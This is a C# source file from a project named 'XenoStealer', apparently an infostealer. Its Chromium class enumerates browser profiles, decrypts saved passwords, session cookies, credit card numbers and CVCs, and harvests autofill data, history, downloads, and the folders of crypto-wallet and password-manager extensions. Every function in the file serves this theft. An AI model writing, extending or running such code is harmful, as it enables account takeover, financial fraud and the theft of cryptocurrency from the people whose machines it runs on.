using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using static XenoStealer.DataExtractionStructs;

namespace XenoStealer
{
    public static class Chromium
    {
        public static DataExtractionStructs.ChromiumBrowser[] GetAllInfo(DataExtractionStructs.ChromiumBrowserOptions options) 
        {
            List<DataExtractionStructs.ChromiumBrowser> browsers = new List<DataExtractionStructs.ChromiumBrowser>();

            bool ShouldGetLogins = (options & ChromiumBrowserOptions.Logins) == ChromiumBrowserOptions.Logins;
            bool ShouldGetCookies = (options & ChromiumBrowserOptions.Cookies) == ChromiumBrowserOptions.Cookies;
            bool ShouldGetAutofills = (options & ChromiumBrowserOptions.Autofills) == ChromiumBrowserOptions.Autofills;
            bool ShouldGetDownloads = (options & ChromiumBrowserOptions.Downloads) == ChromiumBrowserOptions.Downloads;
            bool ShouldGetHistory = (options & ChromiumBrowserOptions.History) == ChromiumBrowserOptions.History;
            bool shouldGetCreditCards = (options & ChromiumBrowserOptions.CreditCards) == ChromiumBrowserOptions.CreditCards;
            bool shouldGetCryptoExtensions = (options & ChromiumBrowserOptions.CryptoExtensions) == ChromiumBrowserOptions.CryptoExtensions;
            bool shouldGetPasswordManagerExtensions = (options & ChromiumBrowserOptions.PasswordManagerExtensions) == ChromiumBrowserOptions.PasswordManagerExtensions;


            if (!ShouldGetLogins && !ShouldGetCookies && !ShouldGetAutofills && !ShouldGetDownloads && !ShouldGetHistory && !shouldGetCreditCards && !shouldGetCryptoExtensions && !shouldGetPasswordManagerExtensions)
            {
                return new DataExtractionStructs.ChromiumBrowser[0];
            }

            foreach (KeyValuePair<string, string> browserInfo in Configuration.ChromiumBrowsers)
            {
                List<DataExtractionStructs.ChromiumProfile> profiles = new List<DataExtractionStructs.ChromiumProfile>();
                

                string browserName = browserInfo.Key;
                string browserProfilesPath = browserInfo.Value;
                string[] browserLibraryPaths = Configuration.ChromiumBrowsersLikelyLocations[browserName];
                if (!Directory.Exists(browserProfilesPath))
                {
                    continue;
                }

                ChromeDecryptor decryptor = new ChromeDecryptor(browserProfilesPath, browserLibraryPaths);
                bool canDecrypt = decryptor.operational;

                foreach (string profile in GetProfiles(browserProfilesPath)) 
                {
                    string profilePath = Path.Combine(browserProfilesPath, profile);

                    ChromiumLogin[] logins = null;
                    ChromiumCookie[] cookies = null;
                    ChromiumAutoFill[] autofills = null;
                    ChromiumDownload[] downloads = null;
                    ChromiumHistoryEntry[] history = null;
                    ChromiumCreditCard[] creditCards = null;
                    ChromiumCryptoExtension[] cryptoExtensions = null;
                    ChromiumPasswordExtension[] passwordExtensions = null;

                    if (ShouldGetLogins && decryptor.operational)
                    {
                        logins = GetLogins(profilePath, decryptor);
                    }
                    if (ShouldGetCookies && decryptor.operational)
                    {
                        cookies = GetCookies(profilePath, decryptor);
                    }
                    if (ShouldGetAutofills)
                    {
                        autofills = GetAutoFills(profilePath);
                    }

                    if (ShouldGetDownloads)
                    {
                        downloads = GetDownloads(profilePath);
                    }

                    if (ShouldGetHistory)
                    {
                        history = GetHistory(profilePath);
                    }

                    if (shouldGetCreditCards && decryptor.operational)
                    {
                        creditCards = GetCreditCards(profilePath, decryptor);
                    }

                    if (shouldGetCryptoExtensions)
                    {
                        cryptoExtensions = GetCryptoExtensions(profilePath);
                    }

                    if (shouldGetPasswordManagerExtensions)
                    {
                        passwordExtensions = GetPasswordManagerExtensions(profilePath);
                    }
                    profiles.Add(new ChromiumProfile(logins, cookies, autofills, downloads, history, creditCards, cryptoExtensions, passwordExtensions, profile));
                }
                browsers.Add(new ChromiumBrowser(profiles.ToArray(), browserName));

            }
            return browsers.ToArray();
        }

        public static string[] GetProfiles(string userDataPath) 
        {
            List<string> profiles = new List<string>();
            if (!Directory.Exists(Path.Combine(userDataPath, "Default"))) 
            {
                profiles.Add("");
                return profiles.ToArray();
            }
            profiles.Add("Default");
            int count = 1;
            while (true) 
            {
                string profile = Path.Combine(userDataPath, "Profile " + count.ToString());
                if (Directory.Exists(profile))
                {
                    count++;
                    profiles.Add(profile);
                }
                else 
                {
                    break;
                }
            }

            return profiles.ToArray();
        }

        public static DataExtractionStructs.ChromiumLogin[] GetLogins(string profilePath, ChromeDecryptor decryptor) 
        {
            List<DataExtractionStructs.ChromiumLogin> logins = new List<DataExtractionStructs.ChromiumLogin>();
        
            string db_location = Path.Combine(profilePath, "Login Data");
            if (!File.Exists(db_location))
            {
                return null;
            }
        
            byte[] fileBytes = Utils.ForceReadFile(db_location);
            if (fileBytes == null)
            {
                return null;
            }
        
            SqlLite3Parser parser;
            try
            {
                parser = new SqlLite3Parser(fileBytes);
            }
            catch
            {
                return null;
            }
        
            if (!parser.ReadTable("logins"))
            {
                return null;
            }
        
            for (int i = 0; i < parser.GetRowCount(); i++)
            {
                byte[] password_buffer = parser.GetValue<byte[]>(i, "password_value");
                string username = parser.GetValue<string>(i, "username_value");
                string url = parser.GetValue<string>(i, "action_url");

                if (password_buffer == null || username == null || url == null) 
                {
                    continue;
                }


                if (string.IsNullOrEmpty(url))
                {
                    string originUrl = parser.GetValue<string>(i, "origin_url");
                    if(originUrl != null) 
                    {
                        url = originUrl;
                    }
                }
        
                string password = decryptor.Decrypt(password_buffer);
        
                if (string.IsNullOrEmpty(password))
                {
                    continue;
                }
                logins.Add(new DataExtractionStructs.ChromiumLogin(username, password, url));
            }
        
            return logins.ToArray();
        
        }
        public static DataExtractionStructs.ChromiumCookie[] GetCookies(string profilePath, ChromeDecryptor decryptor) 
        {
            List<DataExtractionStructs.ChromiumCookie> cookies = new List<DataExtractionStructs.ChromiumCookie>();
        
            string db_location = Path.Combine(profilePath, "Network", "Cookies");
            if (!File.Exists(db_location))
            {
                return null;
            }
        
            byte[] fileBytes = Utils.ForceReadFile(db_location);
            if (fileBytes == null)
            {
                return null;
            }
        
            SqlLite3Parser parser;
            try
            {
                parser = new SqlLite3Parser(fileBytes);
            }
            catch
            {
                return null;
            }
        
            if (!parser.ReadTable("cookies"))
            {
                return null;
            }
        
            for (int i = 0; i < parser.GetRowCount(); i++)
            {
                string domain = parser.GetValue<string>(i, "host_key");
                string name = parser.GetValue<string>(i, "name");
                string path = parser.GetValue<string>(i, "path");
                byte[] encryptedCookieBuffer = parser.GetValue<byte[]>(i, "encrypted_value");
                long expiry = parser.GetValue<long>(i, "expires_utc");
                bool secure = parser.GetValue<int>(i, "is_secure") == 1;
                bool httpOnly = parser.GetValue<int>(i, "is_httponly") == 1;

                if (domain == null || name == null || path == null || encryptedCookieBuffer == null || expiry == 0) continue;
                
        
                
        
                string decryptedCookie = decryptor.Decrypt(encryptedCookieBuffer);
                if (string.IsNullOrEmpty(decryptedCookie))
                {
                    continue;
                }
                cookies.Add(new DataExtractionStructs.ChromiumCookie(domain, path, name, decryptedCookie, expiry, secure, httpOnly));
            }
        
            return cookies.ToArray();
        }
        public static DataExtractionStructs.ChromiumAutoFill[] GetAutoFills(string profilePath) 
        {
            List<DataExtractionStructs.ChromiumAutoFill> autofills = new List<DataExtractionStructs.ChromiumAutoFill>();
        
            string db_location = Path.Combine(profilePath, "Web Data");
            if (!File.Exists(db_location))
            {
                return null;
            }
        
            byte[] fileBytes = Utils.ForceReadFile(db_location);
            if (fileBytes == null)
            {
                return null;
            }
        
            SqlLite3Parser parser;
            try
            {
                parser = new SqlLite3Parser(fileBytes);
            }
            catch
            {
                return null;
            }
        
            if (!parser.ReadTable("autofill"))
            {
                return null;
            }

            for (int i = 0; i < parser.GetRowCount(); i++)
            {
                string name = parser.GetValue<string>(i, "name");
                string value = parser.GetValue<string>(i, "value");

                if (name == null || value == null)
                {
                    continue;
                }
                autofills.Add(new DataExtractionStructs.ChromiumAutoFill(name, value));
            }
        
            return autofills.ToArray();
        }
        public static DataExtractionStructs.ChromiumDownload[] GetDownloads(string profilePath) 
        {
            List<DataExtractionStructs.ChromiumDownload> downloads = new List<DataExtractionStructs.ChromiumDownload>();

            string db_location = Path.Combine(profilePath, "History");
            if (!File.Exists(db_location))
            {
                return null;
            }

            byte[] fileBytes = Utils.ForceReadFile(db_location);
            if (fileBytes == null)
            {
                return null;
            }

            SqlLite3Parser parser;
            try
            {
                parser = new SqlLite3Parser(fileBytes);
            }
            catch
            {
                return null;
            }

            if (!parser.ReadTable("downloads"))
            {
                return null;
            }

            for (int i = 0; i < parser.GetRowCount(); i++) 
            {
                string target_path = parser.GetValue<string>(i, "target_path");
                string tab_url = parser.GetValue<string>(i, "tab_url");

                if (target_path == null || tab_url == null) 
                {
                    continue;
                }

                downloads.Add(new DataExtractionStructs.ChromiumDownload(tab_url, target_path));
            }

            downloads.Reverse(); // reverse it so the new ones are on top and old on bottom

            return downloads.ToArray();


        }
        public static DataExtractionStructs.ChromiumHistoryEntry[] GetHistory(string profilePath) 
        {
            List<DataExtractionStructs.ChromiumHistoryEntry> history = new List<DataExtractionStructs.ChromiumHistoryEntry>();

            string db_location = Path.Combine(profilePath, "History");
            if (!File.Exists(db_location))
            {
                return null;
            }

            byte[] fileBytes = Utils.ForceReadFile(db_location);
            if (fileBytes == null)
            {
                return null;
            }

            SqlLite3Parser parser;
            try
            {
                parser = new SqlLite3Parser(fileBytes);
            }
            catch
            {
                return null;
            }

            if (!parser.ReadTable("urls"))
            {
                return null;
            }

            for (int i = 0; i < parser.GetRowCount(); i++) 
            {
                string url = parser.GetValue<string>(i, "url");
                string title = parser.GetValue<string>(i, "title");

                if (url == null || title == null) 
                {
                    continue;
                }

                history.Add(new DataExtractionStructs.ChromiumHistoryEntry(url, title));
            }

            history.Reverse(); // reverse so the neweset one is on top

            return history.ToArray();

        }
        public static DataExtractionStructs.ChromiumCreditCard[] GetCreditCards(string profilePath, ChromeDecryptor decryptor) 
        {
            List<DataExtractionStructs.ChromiumCreditCard> creditCards = new List<DataExtractionStructs.ChromiumCreditCard>();

            string db_location = Path.Combine(profilePath, "Web Data");
            if (!File.Exists(db_location))
            {
                return null;
            }

            byte[] fileBytes = Utils.ForceReadFile(db_location);
            if (fileBytes == null)
            {
                return null;
            }

            SqlLite3Parser parser;
            try
            {
                parser = new SqlLite3Parser(fileBytes);
            }
            catch
            {
                return null;
            }

            Dictionary<string, string> Guid2CVV = new Dictionary<string, string>();

            if (parser.ReadTable("local_stored_cvc"))
            {
                for (int i = 0; i < parser.GetRowCount(); i++)
                {
                    string guid = parser.GetValue<string>(i, "guid");
                    byte[] encryptedCVV = parser.GetValue<byte[]>(i, "value_encrypted");

                    if (guid == null || encryptedCVV == null)
                    {
                        continue;
                    }

                    string decryptedCVV = decryptor.Decrypt(encryptedCVV);

                    if (decryptedCVV == null)
                    {
                        continue;
                    }
                    Guid2CVV[guid] = decryptedCVV;

                }
            }

            if (!parser.ReadTable("credit_cards")) 
            {
                return null;
            }

            for (int i = 0; i < parser.GetRowCount(); i++) 
            {
                string guid = parser.GetValue<string>(i, "guid");
                string name_on_card = parser.GetValue<string>(i, "name_on_card");
                int expiration_month = parser.GetValue<byte>(i, "expiration_month");
                int expiration_year = parser.GetValue<short>(i, "expiration_year");
                byte[] encryptedCardNumber = parser.GetValue<byte[]>(i, "card_number_encrypted");
                string cvv = "NONE";
                if (Guid2CVV.ContainsKey(guid)) 
                {
                    cvv = Guid2CVV[guid];
                }

                if (name_on_card == null || expiration_month == 0 || expiration_year == 0 || encryptedCardNumber == null) 
                {
                    continue;
                }

                string cardNumber = decryptor.Decrypt(encryptedCardNumber);
                if (cardNumber == null) 
                {
                    continue;
                }

                creditCards.Add(new DataExtractionStructs.ChromiumCreditCard(name_on_card, cardNumber, cvv, expiration_month, expiration_year));
            }

            return creditCards.ToArray();
        }
        public static DataExtractionStructs.ChromiumCryptoExtension[] GetCryptoExtensions(string profilePath) 
        {
            List<DataExtractionStructs.ChromiumCryptoExtension> cryptoExtensions = new List<DataExtractionStructs.ChromiumCryptoExtension>();

            string ExtensionPath = Path.Combine(profilePath, "Local Extension Settings");

            Dictionary<string, string> extentionsList = Configuration.ChromiumCryptoExtensions;
            if (ExtensionPath.ToLower().Contains("microsoft")) //edge has different extensions
            {
                extentionsList = Configuration.EdgeCryptoExtensions;
            }

            foreach (KeyValuePair<string, string> extension in extentionsList)
            {
                string extensionPath = Path.Combine(ExtensionPath, extension.Value);
                if (Directory.Exists(extensionPath))
                {
                    cryptoExtensions.Add(new DataExtractionStructs.ChromiumCryptoExtension(extension.Key, extensionPath));
                }
            }


            return cryptoExtensions.ToArray();

        }
        public static DataExtractionStructs.ChromiumPasswordExtension[] GetPasswordManagerExtensions(string profilePath) 
        {
            List<DataExtractionStructs.ChromiumPasswordExtension> passwordManagerExtensions = new List<DataExtractionStructs.ChromiumPasswordExtension>();

            string ExtensionPath = Path.Combine(profilePath, "Local Extension Settings");

            Dictionary<string, string> extentionsList = Configuration.ChromePasswordManagerExtensions;
            if (ExtensionPath.ToLower().Contains("microsoft")) //edge has different extensions
            {
                extentionsList = Configuration.EdgePasswordManagerExtensions;
            }

            foreach (KeyValuePair<string, string> extension in extentionsList)
            {
                string extensionPath = Path.Combine(ExtensionPath, extension.Value);
                if (Directory.Exists(extensionPath))
                {
                    passwordManagerExtensions.Add(new DataExtractionStructs.ChromiumPasswordExtension(extension.Key, extensionPath));
                }
            }

            return passwordManagerExtensions.ToArray();
        }

    }
}
